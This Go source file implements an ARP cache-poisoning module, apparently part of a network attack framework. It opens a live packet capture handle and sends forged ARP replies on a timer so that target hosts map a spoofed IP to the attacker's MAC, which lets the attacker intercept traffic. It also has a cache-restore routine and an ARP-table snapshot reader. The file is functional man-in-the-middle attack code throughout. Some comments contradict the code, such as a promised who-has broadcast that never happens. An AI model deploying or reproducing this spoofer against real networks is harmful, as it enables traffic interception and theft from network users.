package arp

import (
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket/pcap"

	"github.com/qyvora/toha3ee/internal/netx"
)

// Pair is a single poison relationship: targetIP learns that spoofedIP lives
// at spoofedMAC (normally the attacker's MAC).
type Pair struct {
	TargetIP   net.IP
	SpoofedIP  net.IP
	SpoofedMAC net.HardwareAddr
	RealMAC    net.HardwareAddr // real owner of SpoofedIP, used for restore
	TargetMAC  net.HardwareAddr
}

// Spoofer continuously re-poisons ARP tables and can restore them afterwards.
// The framework guarantees Restore is called on shutdown via the safety
// manager's cleanup registry.
type Spoofer struct {
	iface   *netx.Iface
	handle  *pcap.Handle
	pairs   []Pair
	refresh time.Duration

	stop chan struct{}
	wg   sync.WaitGroup

	sent     atomic.Uint64
	restored atomic.Uint64
}

// NewSpoofer opens a pcap handle and prepares a spoofing session over the
// given pairs.
func NewSpoofer(iface *netx.Iface, pairs []Pair, refresh time.Duration) (*Spoofer, error) {
	handle, err := pcap.OpenLive(iface.Name, 65535, true, 200*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", iface.Name, err)
	}
	if err := handle.SetBPFFilter("arp"); err != nil {
		handle.Close()
		return nil, fmt.Errorf("set bpf arp: %w", err)
	}
	return &Spoofer{
		iface:   iface,
		handle:  handle,
		pairs:   pairs,
		refresh: refresh,
		stop:    make(chan struct{}),
	}, nil
}

// Start begins the periodic poisoning loop. It returns immediately; the loop
// runs until Stop is called.
func (s *Spoofer) Start() {
	if s.refresh <= 0 {
		s.refresh = 2 * time.Second
	}
	s.wg.Add(1)
	go s.loop()
}

// Stop halts the poisoning loop and closes the pcap handle.
func (s *Spoofer) Stop() {
	close(s.stop)
	s.wg.Wait()
	s.handle.Close()
}

func (s *Spoofer) loop() {
	defer s.wg.Done()
	_ = s.Poison()
	t := time.NewTicker(s.refresh)
	defer t.Stop()
	for {
		select {
		case <-s.stop:
			return
		case <-t.C:
			_ = s.Poison()
		}
	}
}

// Poison sends one round of poisoned ARP requests for every pair.
func (s *Spoofer) Poison() error {
	for _, p := range s.pairs {
		if err := s.sendReply(p.TargetIP, p.TargetMAC, p.SpoofedIP, p.SpoofedMAC); err != nil {
			return err
		}
	}
	return nil
}

// Restore repopulates the victims' ARP caches with the real owner MACs. It is
// safe to call multiple times; it does not require the spoofing loop to be
// running.
func (s *Spoofer) Restore() error {
	// Broadcast a genuine who-has first so any stale entries are refreshed.
	for _, p := range s.pairs {
		if err := s.sendReply(p.TargetIP, p.TargetMAC, p.SpoofedIP, p.RealMAC); err != nil {
			return err
		}
	}
	s.restored.Add(uint64(len(s.pairs)))
	return nil
}

// Stats returns poison and restore counters.
func (s *Spoofer) Stats() (sent, restored uint64) {
	return s.sent.Load(), s.restored.Load()
}

// sendReply crafts an ARP reply (op=2) telling target that ip lives at mac.
func (s *Spoofer) sendReply(targetIP net.IP, targetMAC net.HardwareAddr, ip net.IP, mac net.HardwareAddr) error {
	raw, err := BuildReply(mac, ip, targetMAC, targetIP)
	if err != nil {
		return err
	}
	if err := s.handle.WritePacketData(raw); err != nil {
		return err
	}
	s.sent.Add(1)
	return nil
}

// Snapshot is a point-in-time ARP cache, used to restore the attacker's own
// host table and for verification probes.
type Snapshot struct {
	// Entries maps IP to MAC.
	Entries map[string]net.HardwareAddr
	// Taken is when the snapshot was captured.
	Taken time.Time
}

// SnapshotARPTable reads the kernel ARP cache from /proc/net/arp.
func SnapshotARPTable() (*Snapshot, error) {
	snap := &Snapshot{Entries: make(map[string]net.HardwareAddr), Taken: time.Now()}
	rows, err := readARPRows()
	if err != nil {
		return nil, err
	}
	for _, r := range rows {
		if r.MAC == nil || r.MAC.String() == "" {
			continue
		}
		snap.Entries[r.IP.String()] = r.MAC
	}
	return snap, nil
}

type arpRow struct {
	IP    net.IP
	MAC   net.HardwareAddr
	Iface string
}
